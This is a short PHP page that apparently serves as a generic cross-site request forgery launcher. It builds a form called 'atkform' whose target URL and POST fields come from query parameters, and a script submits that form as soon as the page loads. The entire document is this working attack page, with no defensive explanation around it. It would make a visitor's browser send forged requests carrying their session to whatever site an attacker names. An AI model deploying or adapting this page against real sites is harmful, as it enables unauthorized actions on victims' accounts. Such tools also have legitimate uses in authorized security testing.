<html>
<form id="atkform" method="post" action="<?php print(htmlspecialchars($_GET["target"],ENT_QUOTES)); ?>">
<?php
if(isset($_GET["post_params"]) && $_GET["post_params"]) {
foreach ($_GET["post_params"] as $key => $value) {
  print '<input name="'.htmlspecialchars($key).'" value="'.htmlspecialchars($value).'" /><br />\n';
}
}
?>
</form>
<script>document.getElementById("atkform").submit();</script>
</html>